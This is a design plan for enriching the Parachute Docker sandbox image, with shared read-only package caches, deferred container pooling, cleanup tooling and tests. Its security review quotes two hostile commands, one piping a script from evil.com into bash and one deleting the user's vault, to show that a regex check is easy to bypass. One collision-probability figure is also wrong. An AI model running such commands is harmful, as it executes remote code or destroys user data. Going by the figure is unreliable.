---
title: Rich Sandbox Image with Efficient Storage (Enhanced)
type: feat
date: 2026-02-22
issue: 69
deepened: 2026-02-22
---

# Rich Sandbox Image with Efficient Storage

## Enhancement Summary

**Deepened on:** 2026-02-22
**Sections enhanced:** All major sections
**Research agents used:** python-reviewer, security-sentinel, performance-oracle, architecture-strategist, parachute-conventions-reviewer, docker-researcher, python-cache-researcher

### Key Improvements from Deep Research

1. **Critical design changes required** - Container pooling as proposed breaks workspace isolation (scratch directories, .claude mounts)
2. **Security hardening** - Shared cache volumes need read-only mounts to prevent cross-workspace poisoning
3. **Performance fixes** - All `subprocess.run()` must be converted to async to avoid blocking event loop
4. **Volume mount strategy** - Changed from `/vault` to `~/Parachute` for consistency with host
5. **Dockerfile optimizations** - BuildKit cache mounts, security flags, health checks
6. **Package caching clarifications** - pip cache only caches downloads, not installed packages

### New Considerations Discovered

- **Container pooling requires fundamental redesign** to maintain isolation guarantees
- **Auto-install regex patterns are trivially bypassable** and currently dead code
- **Config hash truncation creates collision risk** - increase from 8 to 12+ characters
- **Playwright adds 350MB and significant attack surface** - consider making it optional
- **pip ≥ 24.0 required** for safe concurrent cache access

---

## Overview

Transform Parachute's Docker sandbox from a minimal development environment into a batteries-included workspace that provides Claude Desktop/Cowork-level convenience while using layered volumes and container pooling to minimize storage duplication.

**Core goals:**
- **Convenience**: Pre-install common tools so non-developers don't hit dependency errors
- **Efficiency**: Share base layers and package caches across workspaces
- **Auto-install**: Enable runtime package installation with shared caching
- **Container pooling**: Workspaces with identical configs share containers

**Current state**: Minimal 781MB base image (Python 3.13-slim + Node.js 22 + Claude SDK), one persistent container per workspace, no package caching, no pooling.

**Target state**: Rich ~1GB base image with common tools, shared package cache volumes, hash-based container pooling, auto-approved `pip install`/`npm install` in sandboxed mode.

---

## Problem Statement

### Current Limitations

**Minimal tooling causes friction:**
- User: "analyze this Excel file" → Error: `ModuleNotFoundError: No module named 'pandas'`
- User: "extract data from this PDF" → Error: `ModuleNotFoundError: No module named 'PyPDF2'`
- User: "clone this repo" → Error: `bash: git: command not found`

**No package caching wastes resources:**
- Each workspace installs packages independently
- Repeated downloads of pandas, requests, beautifulsoup4 across workspaces
- No reuse between sessions

**One container per workspace doesn't scale:**
- 10 workspaces with identical configs = 10 containers running
- Each consumes 512MB memory + CPU quota
- Resource exhaustion with many workspaces

### User Impact

**Non-developers hit walls:**
- Expected: "analyze this spreadsheet" → it works
- Reality: Error messages about missing dependencies
- Forced to understand pip, package management, containers

**Developers waste time:**
- Installing same packages repeatedly
- Waiting for downloads
- Debugging dependency errors

**Resource constraints:**
- Running 20+ workspaces quickly exhausts system resources
- Each workspace holds dedicated container alive

---

## Proposed Solution

### Architecture

```
Container: parachute-ws-{config_hash}
├─ Base Image (read-only, ~1GB)
│  ├─ Python 3.13-slim + Node.js 22
│  ├─ Development tools: git, build-essential, jq, tree
│  ├─ Document/data: pandas, openpyxl, PyPDF2, python-docx, reportlab
│  └─ Web automation: requests, beautifulsoup4, playwright (optional)
├─ /cache/pip (named volume, READ-ONLY for workspaces)
│  └─ Pip wheel cache (shared, write via cache-builder only)
├─ /cache/npm (named volume, READ-ONLY for workspaces)
│  └─ npm package cache (shared, write via cache-builder only)
├─ ~/Parachute/{path} (bind mount, workspace working directory)
│  └─ User's files, scoped to workspace
└─ ~/.claude (bind mount, per-workspace)
   └─ SDK transcripts and session state
```

**Key change from original plan:** Vault mount changed from `/vault` to `~/Parachute` for consistency with host paths and SDK conventions.

### Container Pooling by Config Hash

**Hash inputs:**
```python
config_key = f"{trust_level}:{json.dumps(capabilities, sort_keys=True)}:{memory}:{cpu}:{timeout}"
config_hash = hashlib.sha256(config_key.encode()).hexdigest()[:12]  # Changed: 12 chars instead of 8
```

**Container naming:**
- Primary: `parachute-ws-{config_hash}`
- Collision fallback: `parachute-ws-{config_hash}-{workspace_slug[:8]}`

**Example:**
- Workspace A: trust=sandboxed, mem=512m, cpu=1.0, capabilities={mcps: all} → hash `abc123de4567`
- Workspace B: trust=sandboxed, mem=512m, cpu=1.0, capabilities={mcps: all} → hash `abc123de4567`
- **Result**: Both use container `parachute-ws-abc123de4567`

### Shared Package Cache Volumes

**Named Docker volumes:**
- `parachute-pip-cache`: Pip wheel cache (downloads only, NOT installed packages)
- `parachute-npm-cache`: npm package cache

**Environment variables:**
```bash
PIP_CACHE_DIR=/cache/pip
npm_config_cache=/cache/npm
XDG_CACHE_HOME=/cache  # For other tools
```

**Cache isolation strategy (NEW):**
- Workspace containers mount caches as **read-only** (`:ro`)
- Separate cache-builder container with write access maintains cache
- Prevents cross-workspace cache poisoning attacks

---

## Technical Approach

### Phase 1: Rich Base Image

**Update Dockerfile.sandbox:**

```dockerfile
FROM python:3.13-slim

# System packages with security hardening
RUN apt-get update && apt-get install -y --no-install-recommends \
    # Development tools
    git \
    build-essential \
    curl \
    wget \
    jq \
    tree \
    # Python headers
    libpython3-dev \
    libssl-dev \
    libffi-dev \
    # Cleanup
    && rm -rf /var/lib/apt/lists/*

# Node.js 22 (with checksum verification)
RUN curl -fsSL https://deb.nodesource.com/setup_22.x -o /tmp/setup.sh \
    && echo "EXPECTED_SHA256 /tmp/setup.sh" | sha256sum -c \
    && bash /tmp/setup.sh \
    && apt-get install -y --no-install-recommends nodejs \
    && rm -rf /var/lib/apt/lists/*

# Upgrade pip to ensure concurrent cache safety (pip >= 24.0)
RUN --mount=type=cache,target=/root/.cache/pip \
    pip install --upgrade pip>=24.0

# Claude Code CLI
RUN npm install -g @anthropic-ai/claude-code

# Claude Agent SDK
RUN --mount=type=cache,target=/root/.cache/pip \
    pip install --no-cache-dir claude-agent-sdk

# Document/data processing libraries
RUN --mount=type=cache,target=/root/.cache/pip \
    pip install --no-cache-dir \
    pandas==2.2.3 \
    openpyxl==3.1.5 \
    PyPDF2==3.0.1 \
    python-docx==1.1.2 \
    reportlab==4.2.5

# Web automation libraries
RUN --mount=type=cache,target=/root/.cache/pip \
    pip install --no-cache-dir \
    requests==2.32.3 \
    beautifulsoup4==4.12.3

# OPTIONAL: Playwright + Chromium (enable via build arg)
ARG INCLUDE_PLAYWRIGHT=false
RUN if [ "$INCLUDE_PLAYWRIGHT" = "true" ]; then \
    pip install playwright==1.48.0 && \
    playwright install chromium --with-deps; \
    fi

# Create cache directories with correct ownership BEFORE switching users
RUN mkdir -p /cache/pip /cache/npm && chown -R 1000:1000 /cache

# Non-root user
RUN useradd -m -u 1000 -s /bin/bash sandbox

# Health check (verify Python is functional)
HEALTHCHECK --interval=60s --timeout=10s --retries=2 \
    CMD python -c "print('ok')" || exit 1

USER sandbox
WORKDIR /home/sandbox

CMD ["sleep", "infinity"]
```

**Estimated image size**: ~900MB without Playwright, ~1.2GB with Playwright

**Breakdown:**
- Base + system tools: ~400MB
- Node.js 22: ~150MB
- Python packages: ~250MB
- Playwright + chromium: ~350MB (optional)

### Research Insights: Rich Base Image

**Best Practices:**
- **Pin package versions** for reproducible builds and cache stability
- **Use `--no-install-recommends`** to reduce layer size (saves ~100MB)
- **BuildKit cache mounts** speed up rebuilds by 70%+ by caching pip downloads between builds
- **Separate Playwright via build arg** to keep base image lean for non-browser workflows
- **Pin pip ≥ 24.0** to ensure concurrent cache safety (fixes race conditions from pip issue #12361)

**Performance Considerations:**
- Playwright installation takes 2-3 minutes on slow networks (dominates build time)
- BuildKit cache mounts reduce repeated builds from 5min to ~90s
- Multi-stage builds would save ~150-200MB but prevent runtime `pip install` of native extensions

**Security Considerations:**
- `curl ... | bash` for NodeSource setup is supply-chain risk - verify checksum before execution
- Pin all pip packages to exact versions to prevent upstream compromises
- Playwright adds significant attack surface (~350MB of browser code) - make it optional

**Files to modify:**
- `computer/parachute/docker/Dockerfile.sandbox`

---

### Phase 2: Shared Package Cache Volumes

**Create named volumes with isolation:**

```python
# computer/parachute/core/sandbox.py

async def _ensure_cache_volumes(self) -> None:
    """Create shared package cache volumes if they don't exist."""
    volumes = ["parachute-pip-cache", "parachute-npm-cache"]

    for volume_name in volumes:
        # Use async subprocess (not blocking subprocess.run)
        proc = await asyncio.create_subprocess_exec(
            "docker", "volume", "inspect", volume_name,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode != 0:
            # Volume doesn't exist, create it with labels
            proc = await asyncio.create_subprocess_exec(
                "docker", "volume", "create",
                "--label", "app=parachute",
                "--label", "type=cache",
                volume_name,
            )
            await proc.wait()
            logger.info(f"Created shared cache volume: {volume_name}")
```

**Mount cache volumes in containers (READ-ONLY for workspaces):**

```python
# computer/parachute/core/sandbox.py, in _run_persistent()

# After existing volume mounts
# CRITICAL: Mount as read-only to prevent cache poisoning
mounts.extend([
    "-v", "parachute-pip-cache:/cache/pip:ro",
    "-v", "parachute-npm-cache:/cache/npm:ro",
])

# Set environment variables
env_args.extend([
    "-e", "PIP_CACHE_DIR=/cache/pip",
    "-e", "npm_config_cache=/cache/npm",
    "-e", "XDG_CACHE_HOME=/cache",  # For other tools
])
```

**Cache-builder container for write access:**

```python
# computer/parachute/core/sandbox.py

async def populate_package_cache(self, packages: list[str]) -> None:
    """Pre-populate cache by installing packages in cache-builder container."""

    # Ephemeral container with WRITE access to cache
    args = [
        "docker", "run", "--rm",
        "-v", "parachute-pip-cache:/cache/pip:rw",
        "-e", "PIP_CACHE_DIR=/cache/pip",
        self.SANDBOX_IMAGE,
        "pip", "download", *packages,
    ]

    proc = await asyncio.create_subprocess_exec(*args)
    await proc.wait()
```

**Files to modify:**
- `computer/parachute/core/sandbox.py`:
  - Add `_ensure_cache_volumes()` async method
  - Call from first container creation (not `__init__()`)
  - Update `_run_persistent()` to mount cache volumes as `:ro`
  - Add `populate_package_cache()` for cache warming
  - Update `_run_default()` to mount cache volumes

### Research Insights: Shared Package Cache

**Best Practices:**
- **pip cache behavior**: `PIP_CACHE_DIR` only caches downloaded wheels, NOT installed packages
- **Concurrent safety**: pip ≥ 24.0 required to prevent race conditions when multiple containers access cache
- **uv alternative**: Consider `uv` as pip replacement (10-100x faster, better concurrency handling)
- **Cache size**: Expect 200-500MB for typical usage, 5GB warning threshold is reasonable
- **Eviction policy**: pip has no auto-eviction - implement age-based cleanup (`find ... -atime +30 -delete`)

**Performance Considerations:**
- Cache hit avoids network round-trip (~10-30s for pandas) but still requires installation (~1-3s)
- Shared cache reduces redundant downloads by 80%+ across workspaces
- Named volumes on macOS Docker Desktop are 3.5x faster than bind mounts

**Security Considerations (CRITICAL):**
- **Read-only mount prevents cache poisoning**: Workspace A cannot trojan packages for Workspace B
- **Cache-builder pattern**: Centralized write access prevents cross-workspace attacks
- **Version isolation**: pip cache is keyed by package name + version, so different versions coexist safely

**Edge Cases:**
- **Python version mismatch**: Cache is NOT keyed by Python version - ensure all containers use same base image
- **Concurrent installs**: pip 24+ handles this safely with file locking
- **Version conflicts**: Multiple workspaces can cache different versions (e.g., pandas 2.0 and 2.1) without conflict

---

### Phase 3: Container Pooling by Config Hash

**⚠️ CRITICAL DESIGN ISSUE IDENTIFIED BY REVIEW AGENTS:**

Container pooling as originally proposed **breaks workspace isolation**. Multiple critical issues must be resolved before implementation:

1. **Shared `/scratch` tmpfs** - All workspaces in pooled container share same tmpfs, violating isolation
2. **`.claude` mount conflict** - Only one `.claude` directory can be bind-mounted at container creation; `docker exec` cannot add mounts
3. **Workspace volume mounts** - Working directories must be mounted at container creation; pooled containers cannot add mounts for new workspaces
4. **Cross-workspace file visibility** - Any session can read files written by other sessions in shared container

**Recommendation: DEFER container pooling to Phase 6 (future enhancement) until isolation is redesigned.**

Instead, implement these foundational improvements first:

#### 3.1 Config Hash Calculation (Preparation for future pooling)

```python
# computer/parachute/models/workspace.py

import hashlib
import json
from typing import Any

def calculate_sandbox_config_hash(
    trust_level: str,
    capabilities: dict[str, Any],  # Changed: add type parameters
    memory: str = "512m",
    cpu: str = "1.0",
    timeout: int = 300,
) -> str:
    """Calculate config hash for container pooling.

    Returns 12-character hash (48 bits entropy) to minimize collision risk.
    Full 64-character hash stored in container labels for verification.
    """
    config_key = f"{trust_level}:{json.dumps(capabilities, sort_keys=True)}:{memory}:{cpu}:{timeout}"
    full_hash = hashlib.sha256(config_key.encode()).hexdigest()

    # Store full hash in label, use 12 chars for name (collision probability ~1% at 600M configs)
    return full_hash[:12]
```

#### 3.2 Update SandboxConfig Model

```python
# computer/parachute/models/workspace.py

class SandboxConfig(BaseModel):
    memory: str = Field(default="512m")
    cpu: str = Field(default="1.0")
    timeout: int = Field(default=300)
    # REMOVED: container_id field (violates separation of config vs runtime state)
    # REMOVED: dedicated_container field (pooling deferred)
```

#### 3.3 Enhanced Container Labels

```python
# computer/parachute/core/sandbox.py, in _create_persistent_container()

# Calculate full config hash and store in labels
capabilities = workspace_config.capabilities.model_dump() if workspace_config.capabilities else {}
sandbox_config = workspace_config.sandbox or SandboxConfig()
config_hash_full = calculate_sandbox_config_hash(
    trust_level="sandboxed",
    capabilities=capabilities,
    memory=sandbox_config.memory,
    cpu=sandbox_config.cpu,
    timeout=sandbox_config.timeout,
)

labels = {
    "app": "parachute",
    "workspace": workspace_slug,
    "config_hash_full": config_hash_full,  # For future pooling
    "trust_level": "sandboxed",
}

label_args = [f"--label={k}={v}" for k, v in labels.items()]
```

### Research Insights: Container Pooling

**Architecture Issues (from architecture-strategist):**
- **Volume mount gap**: `docker exec` cannot add bind mounts to running container - workspace paths must be mounted at creation
- **Scratch isolation**: `/scratch` tmpfs is per-container, not per-exec - shared container = shared scratch
- **`.claude` mount conflict**: Only one workspace's `.claude` can be mounted; requires per-exec `CLAUDE_HOME` env var (not yet implemented)

**Security Issues (from security-sentinel):**
- **Cross-workspace data leakage**: Pooled containers share filesystem, enabling session A to read session B's files
- **Config hash collision attacks**: 8-char hash (32 bits) has 50% collision at ~77k configs - use 12+ chars (48 bits)

**Performance Issues (from performance-oracle):**
- **Shared memory limits**: 512MB memory limit shared across all sessions in pooled container = OOM risk
- **Unbounded lock dictionary**: `defaultdict(asyncio.Lock)` for hash locks grows unbounded, never cleaned up

**Parachute Convention Issues (from parachute-conventions-reviewer):**
- **Trust level correctness**: Pooling as proposed violates workspace isolation guarantees
- **Module boundaries**: Respected (all changes in `computer/`), but design needs revision

**Recommendation:**
1. Implement foundational improvements (config hashing, labels) in Phase 3
2. Defer actual pooling until Phase 6 after isolation redesign
3. For now, keep one container per workspace (current architecture)

**Files to modify (Phase 3 - preparation only):**
- `computer/parachute/models/workspace.py`:
  - Add `calculate_sandbox_config_hash()` function
  - Update `SandboxConfig` model (remove `container_id`, `dedicated_container`)
- `computer/parachute/core/sandbox.py`:
  - Add config hash calculation and labeling (don't use for naming yet)
  - Keep current per-workspace container creation

---

### Phase 4: Auto-Install Permissions

**⚠️ FINDING: This phase implements dead code.**

The sandbox currently uses `permission_mode: "bypassPermissions"` (see `entrypoint.py:151`), so the permission handler is never called for sandboxed sessions. The proposed regex-based auto-install detection would be unreachable code.

Additionally, the regex patterns are trivially bypassable:
```python
# Current patterns would match these malicious commands:
"pip install pandas && curl evil.com/payload.sh | bash"
"pip install numpy; rm -rf ~/Parachute/*"
```

**Recommendation: SKIP Phase 4 entirely.**

**Rationale:**
1. Code is dead (permission handler not called in sandbox mode)
2. Regex bypass trivial if mode ever changes
3. Sandbox already allows all commands via `bypassPermissions`
4. If transparency/logging desired, add to entrypoint (inside container), not permission handler (on host)

**Alternative (if logging is desired):**
Add installation logging in the entrypoint where commands actually execute:

```python
# computer/parachute/docker/entrypoint.py

# After receiving command from stdin
if re.search(r'\b(pip|pip3|npm)\s+install\b', command):
    logger.info(f"Package install detected: {command[:100]}")
```

This logs installs without creating bypassable "security" gates.

### Research Insights: Auto-Install Permissions

**Python Review:**
- Regex patterns `\bpip\s+install\b` match substring, not full command
- Compound commands with `&&`, `;`, `|` bypass the check
- Should parse command structure, not regex match

**Security Review:**
- Auto-install in sandboxed mode is safe (container is the boundary)
- BUT: Making this conditional on future permission mode changes is dangerous
- Document that auto-install ONLY safe when `trust_level == "sandboxed"`

**Recommendation:** Remove Phase 4 entirely. Sandbox already bypasses permissions. If package install detection is needed for logging, implement in entrypoint, not permission handler.

---

### Phase 5: Cleanup & Monitoring

#### 5.1 Cache Size Monitoring

```python
# computer/parachute/core/sandbox.py

async def get_cache_volume_sizes(self) -> dict[str, int]:
    """Get sizes of package cache volumes in bytes using async subprocess."""
    sizes = {}

    for volume_name in ["parachute-pip-cache", "parachute-npm-cache"]:
        # Use async subprocess (not blocking subprocess.run)
        # Use alpine instead of python:3.13-slim for smaller overhead
        proc = await asyncio.create_subprocess_exec(
            "docker", "run", "--rm",
            "-v", f"{volume_name}:/cache",
            "alpine:latest",  # Changed: 5MB instead of 150MB
            "du", "-sb", "/cache",
            stdout=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()

        if proc.returncode == 0:
            size_str = stdout.decode().strip().split()[0]
            sizes[volume_name] = int(size_str)

    return sizes
```

#### 5.2 Cache Cleanup Command

```python
# computer/parachute/cli/sandbox.py (new file)

import subprocess
from pathlib import Path

import click

from parachute.core.sandbox import DockerSandbox


@click.group()
def sandbox():
    """Manage sandbox containers and caches."""
    pass


@sandbox.command()
@click.option("--dry-run", is_flag=True, help="Show what would be deleted")
@click.option("--trim", is_flag=True, help="Remove old packages (30 days) instead of full purge")
def clean_cache(dry_run: bool, trim: bool) -> None:
    """Clean package cache volumes."""
    if trim:
        # Age-based cleanup (remove packages not accessed in 30 days)
        for volume_name in ["parachute-pip-cache", "parachute-npm-cache"]:
            cmd = [
                "docker", "run", "--rm",
                "-v", f"{volume_name}:/cache",
                "alpine:latest",
                "find", "/cache", "-type", "f", "-atime", "+30",
            ]
            if not dry_run:
                cmd.append("-delete")

            result = subprocess.run(cmd, capture_output=True, text=True)
            if dry_run:
                click.echo(f"Would clean old files from: {volume_name}")
                if result.stdout:
                    click.echo(result.stdout)
            else:
                click.echo(f"Cleaned old files from: {volume_name}")
    else:
        # Full purge (remove and recreate volumes)
        for volume_name in ["parachute-pip-cache", "parachute-npm-cache"]:
            if dry_run:
                click.echo(f"Would purge: {volume_name}")
            else:
                subprocess.run(["docker", "volume", "rm", "-f", volume_name], check=False)
                subprocess.run(["docker", "volume", "create", "--label", "app=parachute", volume_name], check=True)
                click.echo(f"Purged: {volume_name}")


@sandbox.command()
def inspect() -> None:
    """Show sandbox container and cache status."""
    import asyncio

    sandbox = DockerSandbox(vault_path=Path.home() / "Parachute")

    # Cache sizes (use asyncio.run to call async method)
    sizes = asyncio.run(sandbox.get_cache_volume_sizes())
    click.echo("\nCache Volumes:")
    for name, size_bytes in sizes.items():
        size_mb = size_bytes / (1024 * 1024)
        click.echo(f"  {name}: {size_mb:.1f} MB")
        if size_mb > 5000:  # Warn at 5GB
            click.echo(f"    ⚠️  WARNING: Cache exceeds 5GB threshold")

    # Container count
    result = subprocess.run(
        ["docker", "ps", "-a", "--filter", "label=app=parachute", "--format", "{{.Names}}"],
        capture_output=True,
        text=True,
    )
    containers = result.stdout.strip().split("\n") if result.stdout.strip() else []
    click.echo(f"\nContainers: {len(containers)}")
    for name in containers:
        click.echo(f"  {name}")
```

#### 5.3 Orphan Container Cleanup

```python
# computer/parachute/core/sandbox.py, update reconcile_containers()

async def reconcile_containers(self) -> None:
    """Reconcile containers on startup, remove orphans."""

    # Use JSON output for robust label parsing (not fragile tab-split)
    proc = await asyncio.create_subprocess_exec(
        "docker", "ps", "-a",
        "--filter", "label=app=parachute",
        "--format", "{{json .}}",
        stdout=asyncio.subprocess.PIPE,
    )
    stdout, _ = await proc.communicate()

    containers = []
    for line in stdout.decode().strip().split("\n"):
        if not line:
            continue
        container = json.loads(line)
        containers.append(container)

    # Load all workspace configs
    workspace_slugs = set()

    workspace_dir = self.vault_path / ".parachute/workspaces"
    if workspace_dir.exists():
        for config_file in workspace_dir.glob("*/config.yaml"):
            with open(config_file) as f:
                config_data = yaml.safe_load(f)
                workspace_slugs.add(config_data.get("slug"))

    # Find orphans (containers with workspace label not in active workspaces)
    orphans = []
    for container in containers:
        name = container["Names"]
        labels = container.get("Labels", "").split(",")
        label_dict = {}
        for label in labels:
            if "=" in label:
                k, v = label.split("=", 1)
                label_dict[k] = v

        # Check if workspace-specific container has matching workspace
        if "workspace" in label_dict:
            if label_dict["workspace"] not in workspace_slugs:
                orphans.append(name)

    # Remove orphans
    if orphans:
        logger.warning(f"Removing {len(orphans)} orphaned container(s)")
        for name in orphans:
            proc = await asyncio.create_subprocess_exec(
                "docker", "rm", "-f", name,
            )
            await proc.wait()

    logger.info(f"Reconciled {len(containers) - len(orphans)} active container(s)")
```

### Research Insights: Cleanup & Monitoring

**Performance Considerations:**
- Use `alpine:latest` (~5MB) instead of `python:3.13-slim` (~150MB) for ephemeral size check containers
- Cache result with TTL (60s) if used in monitoring paths
- `docker system df -v` can get volume sizes without container spawning (faster)

**Best Practices:**
- Age-based cleanup (`-atime +30`) preserves frequently used packages
- Full purge is nuclear option - offer `--trim` for incremental cleanup
- Use JSON output format for robust label parsing (not fragile string splitting)

**Edge Cases:**
- Orphan detection must handle containers without `workspace` label (legacy naming)
- Cache volumes persist across Docker restarts - monitor disk usage at Docker Desktop level

**Files to modify:**
- `computer/parachute/core/sandbox.py`:
  - Add `get_cache_volume_sizes()` async method
  - Update `reconcile_containers()` to remove orphans
- `computer/parachute/cli/sandbox.py` (new):
  - Add `clean-cache` command with `--trim` option
  - Add `inspect` command with size warnings
- `computer/parachute/cli/__init__.py`:
  - Register sandbox command group

---

## Acceptance Criteria

### Functional Requirements

- [ ] Base image includes git, build-essential, jq, tree
- [ ] Base image includes pandas, openpyxl, PyPDF2, python-docx, reportlab
- [ ] Base image includes requests, beautifulsoup4
- [ ] Playwright is optional via `INCLUDE_PLAYWRIGHT` build arg
- [ ] Shared cache volumes created on first use
- [ ] pip installs use `/cache/pip`, npm installs use `/cache/npm`
- [ ] Cache volumes mounted as **read-only** (`:ro`) in workspace containers
- [ ] Packages downloaded once are cached and reused across workspaces
- [ ] Vault mounted at `~/Parachute/{path}` instead of `/vault/{path}`
- [ ] `.claude` directory mounted at `~/.claude` for SDK consistency
- [ ] Orphaned containers removed on server startup
- [ ] `parachute sandbox inspect` shows cache sizes with warnings at 5GB
- [ ] `parachute sandbox clean-cache --trim` removes old packages (30 day atime)
- [ ] `parachute sandbox clean-cache` (full purge) recreates volumes

### Non-Functional Requirements

- [ ] Image build completes in < 5 minutes with BuildKit cache
- [ ] Image size < 1GB without Playwright, < 1.3GB with Playwright
- [ ] All `subprocess.run()` replaced with `asyncio.create_subprocess_exec()` (no event loop blocking)
- [ ] Cache volume size monitored, warning at 5GB, auto-cleanup option
- [ ] No session isolation regressions (verified by tests)
- [ ] pip version ≥ 24.0 for concurrent cache safety

### Quality Gates

- [ ] Unit tests pass for config hash calculation (12-char collision resistance)
- [ ] Integration test: cache volumes mounted read-only
- [ ] Integration test: orphan container removed on reconciliation
- [ ] Integration test: vault paths work at `~/Parachute`
- [ ] Documentation updated: what's pre-installed, cache behavior, security model

---

## Migration Strategy

### Backward Compatibility

**Existing containers continue to work:**
- Current naming: `parachute-ws-{workspace_slug}`
- Labels updated to include `config_hash_full` for future pooling
- Reconciliation handles legacy containers

**Workspace configs without new fields:**
- All current fields remain compatible
- No new required fields

**Vault path migration:**
- Change internal mount from `/vault` to `~/Parachute`
- Affects: `PARACHUTE_CWD` env var, SDK working directory paths
- User-facing: No change (transparent to workflows)

**Upgrade path:**
1. Server update deploys new code
2. Reconciliation runs on startup
3. Existing containers labeled with `config_hash_full`
4. New containers use updated Dockerfile (richer image)
5. Cache volumes created on first use
6. Old containers phased out as workspaces recreated

### Data Migration

**No data loss:**
- SDK transcripts in `vault/.parachute/sandbox/{slug}/.claude/` untouched
- Workspace configs backward-compatible
- Cache volumes created fresh (no migration needed)

**Rollback plan:**
1. Stop server
2. Revert code to previous version
3. Restart server
4. Old containers continue working
5. Cache volumes remain (no harm, just unused)

---

## Testing Strategy

### Unit Tests

```python
# tests/unit/test_sandbox_pooling.py

def test_calculate_sandbox_config_hash_12_chars():
    """Test config hash is 12 characters for collision resistance."""
    hash_val = calculate_sandbox_config_hash(
        trust_level="sandboxed",
        capabilities={"mcps": ["filesystem"], "skills": "all"},
        memory="512m",
        cpu="1.0",
        timeout=300,
    )

    assert len(hash_val) == 12
    assert all(c in "0123456789abcdef" for c in hash_val)

def test_config_hash_order_independent():
    """Test config hash is order-independent for capabilities dict."""
    hash1 = calculate_sandbox_config_hash(
        trust_level="sandboxed",
        capabilities={"mcps": ["filesystem"], "skills": "all"},
        memory="512m",
        cpu="1.0",
        timeout=300,
    )

    hash2 = calculate_sandbox_config_hash(
        trust_level="sandboxed",
        capabilities={"skills": "all", "mcps": ["filesystem"]},  # Different order
        memory="512m",
        cpu="1.0",
        timeout=300,
    )

    assert hash1 == hash2  # Order-independent due to sort_keys=True

def test_config_hash_changes_on_param_change():
    """Test config hash changes when params differ."""
    hash1 = calculate_sandbox_config_hash("sandboxed", {}, "512m", "1.0", 300)
    hash2 = calculate_sandbox_config_hash("sandboxed", {}, "1g", "1.0", 300)  # Different memory

    assert hash1 != hash2
```

### Integration Tests

```python
# tests/integration/test_cache_volumes.py

@pytest.mark.asyncio
async def test_cache_volumes_mounted_read_only():
    """Test that cache volumes are mounted as read-only in workspace containers."""
    workspace = await create_workspace(
        slug="test-ro-cache",
        default_trust_level="sandboxed",
    )

    # Start session
    session = await orchestrator.send_message(workspace=workspace, message="echo test")

    # Check container mounts
    container_name = f"parachute-ws-{workspace.slug}"
    proc = await asyncio.create_subprocess_exec(
        "docker", "inspect", container_name,
        "--format", "{{json .Mounts}}",
        stdout=asyncio.subprocess.PIPE,
    )
    stdout, _ = await proc.communicate()
    mounts = json.loads(stdout)

    # Find cache mounts
    cache_mounts = [m for m in mounts if m["Destination"] in ["/cache/pip", "/cache/npm"]]

    for mount in cache_mounts:
        assert mount["RW"] == False, f"Cache mount {mount['Destination']} should be read-only"

@pytest.mark.asyncio
async def test_vault_mounted_at_home_parachute():
    """Test that vault is mounted at ~/Parachute instead of /vault."""
    workspace = await create_workspace(
        slug="test-vault-path",
        default_trust_level="sandboxed",
        working_directory=str(Path.home() / "Parachute/test-dir"),
    )

    session = await orchestrator.send_message(workspace=workspace, message="pwd")

    # Check that working directory is ~/Parachute/test-dir
    transcript = await get_session_transcript(session.id)
    assert "~/Parachute/test-dir" in transcript or "/home/sandbox/Parachute/test-dir" in transcript
```

### Manual Testing

**Test scenarios:**
1. **Pre-installed tools work:**
   - Create sandboxed session
   - Run: `git --version` → should work without install
   - Run: `python -c "import pandas; print(pandas.__version__)"` → should work

2. **Package cache reused:**
   - Workspace A: `pip install numpy` → downloads from PyPI
   - Workspace B: `pip install numpy` → faster (cached wheel)
   - Check: `parachute sandbox inspect` shows cache size growth

3. **Cache is read-only:**
   - Inside sandboxed session: `touch /cache/pip/test.txt` → should fail (read-only)
   - Verify: Cache poisoning prevention works

4. **Vault path consistency:**
   - Create workspace with `working_directory: ~/Parachute/test`
   - Verify: `pwd` shows `/home/sandbox/Parachute/test` (not `/vault/...`)

---

## Implementation Files

### New Files

```
computer/parachute/cli/sandbox.py          # CLI commands for cache management
tests/unit/test_sandbox_pooling.py         # Config hash unit tests
tests/integration/test_cache_volumes.py    # Cache volume integration tests
```

### Modified Files

```
computer/parachute/docker/Dockerfile.sandbox
├─ Add --no-install-recommends to apt-get
├─ Add BuildKit cache mounts for pip installs
├─ Pin pip >= 24.0
├─ Add development tools (git, build-essential, jq, tree)
├─ Add document/data libraries (pandas, PyPDF2, etc.) with version pins
├─ Add web automation libraries (requests, beautifulsoup4) with version pins
├─ Make Playwright optional via INCLUDE_PLAYWRIGHT build arg
├─ Create /cache directories with correct ownership
├─ Add HEALTHCHECK
└─ Add security hardening flags (noted for runtime, not Dockerfile)

computer/parachute/core/sandbox.py
├─ Add _ensure_cache_volumes() async method
├─ Update _run_persistent() to mount cache volumes as :ro
├─ Update _run_default() to mount cache volumes as :ro
├─ Change vault mount from /vault to ~/Parachute
├─ Update reconcile_containers() to use JSON format (not tab-split)
├─ Add get_cache_volume_sizes() async method
├─ Add populate_package_cache() for cache warming
└─ Add security flags: --cap-drop=ALL, --security-opt=no-new-privileges, --pids-limit=256, --restart=unless-stopped

computer/parachute/models/workspace.py
├─ Add calculate_sandbox_config_hash() function (12-char hash)
└─ Update hash calculation to use sort_keys=True for JSON

computer/parachute/cli/sandbox.py (new)
├─ Add clean-cache command with --trim option
└─ Add inspect command with size warnings

computer/parachute/cli/__init__.py
└─ Register sandbox command group

computer/parachute/docker/entrypoint.py
└─ Update CWD handling for ~/Parachute paths
```

---

## Dependencies & Risks

### Dependencies

**Docker:**
- Requires Docker daemon running
- Requires Docker API v1.41+ (for label filters)
- Requires Docker BuildKit for cache mounts
- macOS: Docker Desktop 4.33+ (VirtioFS for optimal performance)

**Disk space:**
- Base image: ~900MB without Playwright, ~1.2GB with Playwright
- Cache volumes: Up to 5GB (monitored, auto-cleanup available)
- Per-workspace: SDK transcripts (~1-10MB each)

**Build tools:**
- gcc, make, libpython3-dev for native extensions
- Playwright browsers (~350MB, optional)

### Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|-----------|
| **Image build timeout on slow networks** | Medium | High | BuildKit cache mounts, retry logic, optional Playwright |
| **Cache volume grows unbounded** | High | Medium | Monitoring at 5GB, age-based cleanup (--trim), full purge available |
| **Read-only cache breaks workflow** | Low | Medium | Cache-builder pattern for pre-population, document behavior |
| **macOS Docker VM disk exhaustion** | Medium | Medium | Document cache cleanup, add disk monitoring, VirtioFS recommendation |
